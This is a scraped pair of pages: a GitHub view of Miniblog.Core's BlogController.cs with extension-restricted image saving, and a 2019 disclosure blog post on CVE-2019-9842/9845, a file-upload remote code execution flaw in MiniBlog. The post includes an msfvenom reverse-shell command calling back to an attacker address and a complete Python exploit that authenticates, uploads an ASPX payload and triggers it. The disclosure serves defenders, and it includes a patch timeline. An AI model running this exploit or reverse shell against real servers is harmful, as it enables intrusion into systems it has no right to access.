=== Content from github.com_41bc308d_20250120_231628.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmadskristensen%2FMiniblog.Core%2Fblob%2Fmaster%2Fsrc%2FControllers%2FBlogController.cs)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmadskristensen%2FMiniblog.Core%2Fblob%2Fmaster%2Fsrc%2FControllers%2FBlogController.cs)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=madskristensen%2FMiniblog.Core)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[madskristensen](/madskristensen)
/
**[Miniblog.Core](/madskristensen/Miniblog.Core)**
Public

* [Notifications](/login?return_to=%2Fmadskristensen%2FMiniblog.Core) You must be signed in to change notification settings
* [Fork
  499](/login?return_to=%2Fmadskristensen%2FMiniblog.Core)
* [Star
   1.5k](/login?return_to=%2Fmadskristensen%2FMiniblog.Core)

* [Code](/madskristensen/Miniblog.Core)
* [Issues
  52](/madskristensen/Miniblog.Core/issues)
* [Pull requests
  8](/madskristensen/Miniblog.Core/pulls)
* [Actions](/madskristensen/Miniblog.Core/actions)
* [Projects
  0](/madskristensen/Miniblog.Core/projects)
* [Security](/madskristensen/Miniblog.Core/security)
* [Insights](/madskristensen/Miniblog.Core/pulse)

Additional navigation options

* [Code](/madskristensen/Miniblog.Core)
* [Issues](/madskristensen/Miniblog.Core/issues)
* [Pull requests](/madskristensen/Miniblog.Core/pulls)
* [Actions](/madskristensen/Miniblog.Core/actions)
* [Projects](/madskristensen/Miniblog.Core/projects)
* [Security](/madskristensen/Miniblog.Core/security)
* [Insights](/madskristensen/Miniblog.Core/pulse)

## Files

 master
## Breadcrumbs

1. [Miniblog.Core](/madskristensen/Miniblog.Core/tree/master)
2. /[src](/madskristensen/Miniblog.Core/tree/master/src)
3. /[Controllers](/madskristensen/Miniblog.Core/tree/master/src/Controllers)
/
# BlogController.cs

Copy path Blame  Blame
## Latest commit

## History

[History](/madskristensen/Miniblog.Core/commits/master/src/Controllers/BlogController.cs)312 lines (251 loc) · 12 KB master
## Breadcrumbs

1. [Miniblog.Core](/madskristensen/Miniblog.Core/tree/master)
2. /[src](/madskristensen/Miniblog.Core/tree/master/src)
3. /[Controllers](/madskristensen/Miniblog.Core/tree/master/src/Controllers)
/
# BlogController.cs

Top
## File metadata and controls

* Code
* Blame

312 lines (251 loc) · 12 KB[Raw](https://github.com/madskristensen/Miniblog.Core/raw/refs/heads/master/src/Controllers/BlogController.cs)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312namespace Miniblog.Core.Controllers{ using Microsoft.AspNetCore.Authorization; using Microsoft.AspNetCore.Mvc; using Microsoft.AspNetCore.OutputCaching; using Microsoft.Extensions.Options;
 using Miniblog.Core.Models; using Miniblog.Core.Services;
 using System; using System.Diagnostics.CodeAnalysis; using System.Linq; using System.Text.RegularExpressions; using System.Threading.Tasks; using System.Xml;
 using WebEssentials.AspNetCore.Pwa;
 public class BlogController : Controller { private readonly IBlogService blog;
 private readonly WebManifest manifest;
 private readonly IOptionsSnapshot<BlogSettings> settings;
 public BlogController(IBlogService blog, IOptionsSnapshot<BlogSettings> settings, WebManifest manifest) { this.blog = blog; this.settings = settings; this.manifest = manifest; }
 [Route("/blog/comment/{postId}")] [HttpPost] public async Task<IActionResult> AddComment(string postId, Comment comment) { var post = await this.blog.GetPostById(postId).ConfigureAwait(true);
 if (!this.ModelState.IsValid) { return this.View(nameof(Post), post); }
 if (post is null || !post.AreCommentsOpen(this.settings.Value.CommentsCloseAfterDays)) { return this.NotFound(); }
 if (comment is null) { throw new ArgumentNullException(nameof(comment)); }
 comment.IsAdmin = this.User.Identity!.IsAuthenticated; comment.Content = comment.Content.Trim(); comment.Author = comment.Author.Trim(); comment.Email = comment.Email.Trim();
 // the website form key should have been removed by javascript unless the comment was // posted by a spam robot if (!this.Request.Form.ContainsKey("website")) { post.Comments.Add(comment); await this.blog.SavePost(post).ConfigureAwait(false); }
 return this.Redirect($"{post.GetEncodedLink()}#{comment.ID}"); }
 [Route("/blog/category/{category}/{page:int?}")] [OutputCache(PolicyName = "default")] public async Task<IActionResult> Category(string category, int page = 0) { // get posts for the selected category. var posts = this.blog.GetPostsByCategory(category);
 // apply paging filter. var filteredPosts = posts.Skip(this.settings.Value.PostsPerPage \* page).Take(this.settings.Value.PostsPerPage);
 // set the view option this.ViewData["ViewOption"] = this.settings.Value.ListView;
 this.ViewData[Constants.TotalPostCount] = await posts.CountAsync().ConfigureAwait(true); this.ViewData[Constants.Title] = $"{this.manifest.Name} {category}"; this.ViewData[Constants.Description] = $"Articles posted in the {category} category"; this.ViewData[Constants.prev] = $"/blog/category/{category}/{page + 1}/"; this.ViewData[Constants.next] = $"/blog/category/{category}/{(page <= 1 ? null : page - 1 + "/")}"; return this.View("~/Views/Blog/Index.cshtml", filteredPosts.AsAsyncEnumerable()); }
 [Route("/blog/tag/{tag}/{page:int?}")] [OutputCache(PolicyName = "default")] public async Task<IActionResult> Tag(string tag, int page = 0) { // get posts for the selected tag. var posts = this.blog.GetPostsByTag(tag);
 // apply paging filter. var filteredPosts = posts.Skip(this.settings.Value.PostsPerPage \* page).Take(this.settings.Value.PostsPerPage);
 // set the view option this.ViewData["ViewOption"] = this.settings.Value.ListView;
 this.ViewData[Constants.TotalPostCount] = await posts.CountAsync().ConfigureAwait(true); this.ViewData[Constants.Title] = $"{this.manifest.Name} {tag}"; this.ViewData[Constants.Description] = $"Articles posted in the {tag} tag"; this.ViewData[Constants.prev] = $"/blog/tag/{tag}/{page + 1}/"; this.ViewData[Constants.next] = $"/blog/tag/{tag}/{(page <= 1 ? null : page - 1 + "/")}"; return this.View("~/Views/Blog/Index.cshtml", filteredPosts.AsAsyncEnumerable()); }
 [Route("/blog/comment/{postId}/{commentId}")] [Authorize] public async Task<IActionResult> DeleteComment(string postId, string commentId) { var post = await this.blog.GetPostById(postId).ConfigureAwait(false);
 if (post is null) { return this.NotFound(); }
 var comment = post.Comments.FirstOrDefault(c => c.ID.Equals(commentId, StringComparison.OrdinalIgnoreCase));
 if (comment is null) { return this.NotFound(); }
 post.Comments.Remove(comment); await this.blog.SavePost(post).ConfigureAwait(false);
 return this.Redirect($"{post.GetEncodedLink()}#comments"); }
 [Route("/blog/deletepost/{id}")] [HttpPost, Authorize, AutoValidateAntiforgeryToken] public async Task<IActionResult> DeletePost(string id) { var existing = await this.blog.GetPostById(id).ConfigureAwait(false); if (existing is null) { return this.NotFound(); }
 await this.blog.DeletePost(existing).ConfigureAwait(false); return this.Redirect("/"); }
 [Route("/blog/edit/{id?}")] [HttpGet, Authorize] public async Task<IActionResult> Edit(string? id) { var categories = await this.blog.GetCategories().ToListAsync(); categories.Sort(); this.ViewData[Constants.AllCats] = categories;
 var tags = await this.blog.GetTags().ToListAsync(); tags.Sort(); this.ViewData[Constants.AllTags] = tags;
 if (string.IsNullOrEmpty(id)) { return this.View(new Post()); }
 var post = await this.blog.GetPostById(id).ConfigureAwait(false);
 return post is null ? this.NotFound() : (IActionResult)this.View(post); }
 [Route("/{page:int?}")] [OutputCache(PolicyName = "default")] public async Task<IActionResult> Index([FromRoute] int page = 0) { // get published posts. var posts = this.blog.GetPosts();
 // apply paging filter. var filteredPosts = posts.Skip(this.settings.Value.PostsPerPage \* page).Take(this.settings.Value.PostsPerPage);
 // set the view option this.ViewData[Constants.ViewOption] = this.settings.Value.ListView;
 this.ViewData[Constants.TotalPostCount] = await posts.CountAsync().ConfigureAwait(true); this.ViewData[Constants.Title] = this.manifest.Name; this.ViewData[Constants.Description] = this.manifest.Description; this.ViewData[Constants.prev] = $"/{page + 1}/"; this.ViewData[Constants.next] = $"/{(page <= 1 ? null : $"{page - 1}/")}";
 return this.View("~/Views/Blog/Index.cshtml", filteredPosts); }
 [Route("/blog/{slug?}")] [OutputCache(PolicyName = "default")] public async Task<IActionResult> Post(string slug) { var post = await this.blog.GetPostBySlug(slug).ConfigureAwait(true);
 return post is null ? this.NotFound() : (IActionResult)this.View(post); }
 /// <remarks>This is for redirecting potential existing URLs from the old Miniblog URL format.</remarks> [Route("/post/{slug}")] [HttpGet] public IActionResult Redirects(string slug) => this.LocalRedirectPermanent($"/blog/{slug}");
 [Route("/blog/{slug?}")] [HttpPost, Authorize, AutoValidateAntiforgeryToken] [SuppressMessage("Globalization", "CA1308:Normalize strings to uppercase", Justification = "Consumer preference.")] public async Task<IActionResult> UpdatePost(Post post) { if (!this.ModelState.IsValid) { return this.View(nameof(Edit), post); }
 if (post is null) { throw new ArgumentNullException(nameof(post)); }
 var existing = await this.blog.GetPostById(post.ID).ConfigureAwait(false) ?? post; var existingPostWithSameSlug = await this.blog.GetPostBySlug(existing.Slug).ConfigureAwait(true);
 if (existingPostWithSameSlug != null && existingPostWithSameSlug.ID != post.ID) {
 existing.Slug = Models.Post.CreateSlug(post.Title + DateTime.UtcNow.ToString("yyyyMMddHHmm")); } string categories = this.Request.Form[Constants.categories]!; string tags = this.Request.Form[Constants.tags]!;
 existing.Categories.Clear(); categories.Split(",", StringSplitOptions.RemoveEmptyEntries) .Select(c => c.Trim().ToLowerInvariant()) .ToList() .ForEach(existing.Categories.Add); existing.Tags.Clear(); tags.Split(",", StringSplitOptions.RemoveEmptyEntries) .Select(t => t.Trim().ToLowerInvariant()) .ToList() .ForEach(existing.Tags.Add); existing.Title = post.Title.Trim(); existing.Slug = !string.IsNullOrWhiteSpace(post.Slug) ? post.Slug.Trim() : Models.Post.CreateSlug(post.Title); existing.IsPublished = post.IsPublished; existing.Content = post.Content.Trim(); existing.Excerpt = post.Excerpt.Trim();
 await this.SaveFilesToDisk(existing).ConfigureAwait(false);
 await this.blog.SavePost(existing).ConfigureAwait(false);
 return this.Redirect(post.GetEncodedLink()); }
 private async Task SaveFilesToDisk(Post post) { var imgRegex = new Regex("<img[^>]+ />", RegexOptions.IgnoreCase | RegexOptions.Compiled); var base64Regex = new Regex("data:[^/]+/(?<ext>[a-z]+);base64,(?<base64>.+)", RegexOptions.IgnoreCase); var allowedExtensions = new[] { ".jpg", ".jpeg", ".gif", ".png", ".webp" };
 foreach (Match? match in imgRegex.Matches(post.Content)) { if (match is null) { continue; }
 var doc = new XmlDocument(); doc.LoadXml($"<root>{match.Value}</root>");
 var img = doc.FirstChild!.FirstChild; var srcNode = img!.Attributes!["src"]; var fileNameNode = img.Attributes["data-filename"];
 // The HTML editor creates base64 DataURIs which we'll have to convert to image // files on disk if (srcNode is null || fileNameNode is null) { continue; }
 var extension = System.IO.Path.GetExtension(fileNameNode.Value);
 // Only accept image files if (!allowedExtensions.Contains(extension, StringComparer.OrdinalIgnoreCase)) { continue; }
 var base64Match = base64Regex.Match(srcNode.Value); if (base64Match.Success) { var bytes = Convert.FromBase64String(base64Match.Groups["base64"].Value); srcNode.Value = await this.blog.SaveFile(bytes, fileNameNode.Value).ConfigureAwait(false);
 img.Attributes.Remove(fileNameNode); post.Content = post.Content.Replace(match.Value, img.OuterXml, StringComparison.OrdinalIgnoreCase); } } } }}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from rastating.github.io_6c570d87_20250120_231628.html ===

[![](/assets/images/avatar.jpg)](/)
# [rastating.github.io](/)

# MiniBlog Remote Code Execution

March 16, 2019

During a review of the MiniBlog project, a Windows based blogging package, I observed an interesting piece of functionality. With most WYSIWYG editors that support images, it’s common to see the images embedded in the markup that is generated, rather than uploaded to the web server. The images are embedded into the markup by using [Data URLs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs) in the `img` elements.

An example of this can be seen in the inspector of the screenshot below:

![](/assets/images/2019-03-16-miniblog-remote-code-execution/editor-img-element.png)

At this point, nothing looked particularly strange. However, upon saving the post and inspecting the same image again, a data URL was no longer being used:

![](/assets/images/2019-03-16-miniblog-remote-code-execution/post-img-element.png)

As can be seen in the above screenshot, instead of an `img` element that reads:

```
<img src="data:image/jpeg;base64,BASE64_CONTENT">

```

There was an element that had a `src` attribute referring to a file on disk:

```
<img src="/posts/files/03d21a01-d1f7-4e09-a6f8-0e67f26eb50b.jpeg" alt="">

```

Examining the code reveals that the post is scanned for data URLs which are subsequently decoded to disk and the corresponding pieces of markup updated to point to the newly created files:

```
private void SaveFilesToDisk(Post post)
{
  foreach (Match match in Regex.Matches(post.Content, "(src|href)=\"(data:([^\"]+))\"(>.*?</a>)?"))
  {
    string extension = string.Empty;
    string filename = string.Empty;

    // Image
    if (match.Groups[1].Value == "src")
    {
      extension = Regex.Match(match.Value, "data:([^/]+)/([a-z]+);base64").Groups[2].Value;
    }
    // Other file type
    else
    {
      // Entire filename
      extension = Regex.Match(match.Value, "data:([^/]+)/([a-z0-9+-.]+);base64.*\">(.*)</a>").Groups[3].Value;
    }

    byte[] bytes = ConvertToBytes(match.Groups[2].Value);
    string path = Blog.SaveFileToDisk(bytes, extension);

    string value = string.Format("src=\"{0}\" alt=\"\" ", path);

    if (match.Groups[1].Value == "href")
        value = string.Format("href=\"{0}\"", path);

    Match m = Regex.Match(match.Value, "(src|href)=\"(data:([^\"]+))\"");
    post.Content = post.Content.Replace(m.Value, value);
  }
}

```

Due to the lack of validation in this method, it is possible to exploit it in order to upload ASPX files and gain remote code execution.

## Crafting a Payload

In the `SaveFilesToDisk` method, there are regular expressions that extract:

* The MIME type
* The base64 content

As MIME types will be in the form of `image/gif` and `image/jpeg`, the software uses the latter half of the MIME type as the file extension to be used. With this in mind, we can manually exploit this by creating a new post, switching the editor to markup mode (last icon in the toolbar) and including an `img` element with a MIME type in the data URL that ends in `aspx`:

![](/assets/images/2019-03-16-miniblog-remote-code-execution/manual-payload.png)

In the above screenshot, I generated the base64 data by creating an ASPX shell using `msfvenom` and encoding with `base64`:

```
$ msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread -f aspx LHOST=192.168.194.141 LPORT=4444 -o shell_no_encoding.aspx
$ base64 -w0 shell_no_encoding.aspx > shell.aspx

```

With netcat listening for incoming connections on port 4444, publishing this post will instantly return a shell once the browser redirects to the new post:

![](/assets/images/2019-03-16-miniblog-remote-code-execution/shell.png)

When examining the post that the browser redirected to after clicking the `Save` button, we can see that the path to the ASPX file is disclosed in the `src` attribute of the `img` element:

![](/assets/images/2019-03-16-miniblog-remote-code-execution/aspx-path.png)

The same vulnerability was also identified within the Miniblog.Core project with the slight difference that the filename to be used can be specified in the `data-filename` attribute of the `img` element as opposed to using the MIME type to determine the file extension.

## Disclosure Timeline

* **2019-03-15**: Vulnerability found, patch created and CVEs requested
* **2019-03-15**: Reach out to vendor to begin disclosure
* **2019-03-16**: CVE-2019-9842 and CVE-2019-9845 assigned to the MiniBlog and MiniBlog.Core vulnerabilities respectively
* **2019-03-16**: Discus with vendor and provide patch
* **2019-03-16**: Patch published to GitHub for both projects

## CVSS v3 Vector

[AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C)

## Proof of Concept Exploit (CVE-2019-9842)

```
import base64
import re
import requests
import os
import sys
import string
import random

if len(sys.argv) < 5:
    print 'Usage: python {file} [base url] [username] [password] [path to payload]'.format(file = sys.argv[0])
    sys.exit(1)

username = sys.argv[2]
password = sys.argv[3]
url = sys.argv[1]
payload_path = sys.argv[4]
extension = os.path.splitext(payload_path)[1][1:]

def random_string(length):
    return ''.join(random.choice(string.ascii_letters) for m in xrange(length))

def request_verification_code(path, cookies = {}):
    r = requests.get(url + path, cookies = cookies)
    m = re.search(r'name="?__RequestVerificationToken"?.+?value="?([a-zA-Z0-9\-_]+)"?', r.text)

    if m is None:
        print '\033[1;31;40m[!]\033[0m Failed to retrieve verification token'
        sys.exit(1)

    token = m.group(1)
    cookie_token = r.cookies.get('__RequestVerificationToken')

    return [token, cookie_token]

payload = None
with open(payload_path, 'rb') as payload_file:
    payload = base64.b64encode(payload_file.read())

# Note: login_token[1] must be sent with every request as a cookie.
login_token = request_verification_code('/views/login.cshtml?ReturnUrl=/')
print '\033[1;32;40m[+]\033[0m Retrieved login token'

login_res = requests.post(url + '/views/login.cshtml?ReturnUrl=/', allow_redirects = False, data = {
    'username': username,
    'password': password,
    '__RequestVerificationToken': login_token[0]
}, cookies = {
    '__RequestVerificationToken': login_token[1]
})

session_cookie = login_res.cookies.get('miniblog')
if session_cookie is None:
    print '\033[1;31;40m[!]\033[0m Failed to authenticate'
    sys.exit(1)

print '\033[1;32;40m[+]\033[0m Authenticated as {user}'.format(user = username)

post_token = request_verification_code('/post/new', {
    '__RequestVerificationToken': login_token[1],
    'miniblog': session_cookie
})

print '\033[1;32;40m[+]\033[0m Retrieved new post token'

post_res = requests.post(url + '/post.ashx?mode=save', data = {
    'id': random_string(16),
    'isPublished': True,
    'title': random_string(8),
    'excerpt': '',
    'content': '<img src="data:image/{ext};base64,{payload}" />'.format(ext = extension, payload = payload),
    'categories': '',
    '__RequestVerificationToken': post_token[0]
}, cookies = {
    '__RequestVerificationToken': login_token[1],
    'miniblog': session_cookie
})

post_url = post_res.text
post_res = requests.get(url + post_url, cookies = {
    '__RequestVerificationToken': login_token[1],
    'miniblog': session_cookie
})
uploaded = True
payload_url = None
m = re.search(r'img src="?(\/posts\/files\/(.+?)\.' + extension + ')"?', post_res.text)

if m is None:
    print '\033[1;31;40m[!]\033[0m Could not find the uploaded payload location'
    uploaded = False

if uploaded:
    payload_url = m.group(1)
    print '\033[1;32;40m[+]\033[0m Uploaded payload to {url}'.format(url = payload_url)

article_id = None
m = re.search(r'article class="?post"? data\-id="?([a-zA-Z0-9\-]+)"?', post_res.text)
if m is None:
    print '\033[1;31;40m[!]\033[0m Could not determine article ID of new post. Automatic clean up is not possible.'
else:
    article_id = m.group(1)

if article_id is not None:
    m = re.search(r'name="?__RequestVerificationToken"?.+?value="?([a-zA-Z0-9\-_]+)"?', post_res.text)
    delete_token = m.group(1)
    delete_res = requests.post(url + '/post.ashx?mode=delete', data = {
        'id': article_id,
        '__RequestVerificationToken': delete_token
    }, cookies = {
        '__RequestVerificationToken': login_token[1],
        'miniblog': session_cookie
    })

    if delete_res.status_code == 200:
        print '\033[1;32;40m[+]\033[0m Deleted temporary post'
    else:
        print '\033[1;31;40m[!]\033[0m Failed to automatically cleanup temporary post'

try:
    if uploaded:
        print '\033[1;32;40m[+]\033[0m Executing payload...'
        requests.get(url + payload_url)
except:
    sys.exit()

```

[#CVE-2019-9842](/tags#CVE-2019-9842)
[#CVE-2019-9845](/tags#CVE-2019-9845)
[#miniblog](/tags#miniblog)
[#offsec](/tags#offsec)
[#asp](/tags#asp)
[#dotnet](/tags#dotnet)

---


